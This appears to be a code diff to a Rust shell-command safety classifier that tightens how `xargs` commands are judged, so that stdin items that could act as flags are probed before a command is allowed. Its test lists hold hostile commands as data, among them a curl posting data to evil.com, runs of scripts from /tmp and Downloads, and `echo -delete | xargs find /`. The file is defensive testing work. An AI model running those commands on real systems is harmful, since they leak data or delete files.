@@ -1,4 +1,5 @@
 use crate::parse::{Token, WordSet};
+use crate::pathctx::item_shape::{LEAD, SPLIT};
 use crate::verdict::{SafetyLevel, Verdict};
 
 static XARGS_FLAGS_WITH_ARG: WordSet = WordSet::new(&["-E", "-I", "-L", "-P", "-d", "-n", "-s"]);
@@ -36,6 +37,7 @@ pub fn is_safe_shell(tokens: &[Token]) -> Verdict {
 pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
     let mut i = 1;
     let mut replstr: Option<String> = None;
+    let mut whole_items = false;
     while i < tokens.len() {
         let s = tokens[i].as_str();
         // `-I R` names a replacement string that xargs substitutes with each stdin item. The
@@ -53,6 +55,7 @@ pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
             i += 1;
             continue;
         }
+        whole_items |= s == "-0" || s.starts_with("-d");
         if XARGS_FLAGS_WITH_ARG.contains(&tokens[i]) {
             i += 2;
             continue;
@@ -74,18 +77,32 @@ pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
         // `find ./src | xargs cat` → `cat ./src/sc_item` (allow), bare `xargs cat` → `cat <?>`
         // (deny). This is the same operand-binding `find -exec` gives `{}`, sourced from the pipe.
         let repr = crate::pathctx::stdin_item_repr().unwrap_or_else(|| "/__SAFE_CHAINS_CMDSUB__".to_string());
-        let inner = if let Some(r) = &replstr {
-            // `-I R`: substitute each occurrence of R with the item representative
-            // (`xargs -I{} rm -rf {}/sub` → `rm -rf <repr>/sub`).
-            shell_words::join(tokens[i..].iter().map(|t| t.as_str().replace(r.as_str(), &repr)))
-        } else {
-            // Appended form: items follow the given operands (`xargs cat` → `cat <repr>`).
-            let mut words: Vec<String> = tokens[i..].iter().map(|t| t.as_str().to_string()).collect();
-            words.push(repr);
-            shell_words::join(&words)
+        let render = |item: &str| {
+            if let Some(r) = &replstr {
+                // `-I R`: substitute each occurrence of R with the item representative
+                // (`xargs -I{} rm -rf {}/sub` → `rm -rf <repr>/sub`).
+                shell_words::join(tokens[i..].iter().map(|t| t.as_str().replace(r.as_str(), item)))
+            } else {
+                // Appended form: items follow the given operands (`xargs cat` → `cat <repr>`).
+                let mut words: Vec<String> = tokens[i..].iter().map(|t| t.as_str().to_string()).collect();
+                words.push(item.to_string());
+                shell_words::join(&words)
+            }
         };
         let _mark = crate::cst::netargs::enter(true);
-        return crate::command_verdict(&inner);
+        let verdict = crate::command_verdict(&render(&repr));
+        // The representative says where an item points, not whether it is a flag: `echo -delete |
+        // xargs find /` hands find `-delete`. Unless every item is known to begin with something
+        // else (find's root), the inner command must also stand an item that is an unknown flag.
+        // Without `-0`, `-d` or `-I`, xargs also splits items at blanks, and any piece can lead.
+        let items = crate::pathctx::stdin_shape();
+        if items.has(LEAD) || (items.has(SPLIT) && !whole_items && replstr.is_none()) {
+            let probe = |flag: &str| crate::command_verdict(&render(flag));
+            return verdict
+                .combine(probe(crate::cst::opaque::FLAG_PROBE))
+                .combine(probe(crate::cst::opaque::SHORT_PROBE));
+        }
+        return verdict;
     }
     Verdict::Allowed(SafetyLevel::Inert)
 }
@@ -154,13 +171,12 @@ mod tests {
         bash_help: "bash --help",
         sh_help: "sh --help",
         // inner commands that do NOT read the injected operand as a path stay allowed:
-        xargs_with_joined_flag: "xargs -I{} basename {}",
-        xargs_npx_safe: "xargs npx eslint src/",
-        xargs_find_safe: "xargs find . -name '*.py'",
         xargs_nested_bash_safe: "xargs bash -c 'git status'",
-        // flow-aware: a WORKSPACE-bounded pipe source keeps a file-reading inner allowed
-        xargs_piped_find_workspace: "find . -name '*.log' | xargs cat",
-        xargs_piped_ls: "ls | xargs wc -l",
+        // flow-aware: a WORKSPACE-bounded pipe source keeps a file-reading inner allowed, when its
+        // items are whole (`-0`, `-I`) and each begins with find's root
+        xargs_piped_find_workspace: "find . -name '*.log' -print0 | xargs -0 cat",
+        xargs_piped_find_replace: "find . -name '*.log' | xargs -I{} cat {}",
+        xargs_piped_echo_known: "echo ./a ./b | xargs cat",
         // engine-authoritative: `bash -c "rm file"` deletes a WORKTREE file → developer.
         bash_c_worktree_rm: "bash -c \"rm file\"",
         // execution-origin: running the workspace's OWN script is the dev loop.
@@ -177,6 +193,15 @@ mod tests {
 
     denied! {
         sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
+        // An item from stdin can be any word, a flag included: anything from an unknown source, a
+        // file named `-n` listed by `ls`, or a piece of a file name xargs split at a blank.
+        xargs_with_joined_flag_denied: "xargs -I{} basename {}",
+        xargs_npx_denied: "xargs npx eslint src/",
+        xargs_find_denied: "xargs find . -name '*.py'",
+        xargs_piped_find_split_denied: "find . -name '*.log' | xargs cat",
+        xargs_piped_ls_denied: "ls | xargs wc -l",
+        xargs_piped_flag_denied: "echo -delete | xargs find /",
+        xargs_piped_flag_replace_denied: "echo -delete | xargs -I{} find / {}",
         // execution-origin: a FOREIGN executor (staged, downloaded, home, system) denies.
         bash_tmp_script_denied: "bash /tmp/evil.sh",
         bash_home_script_denied: "bash ~/Downloads/x.sh",
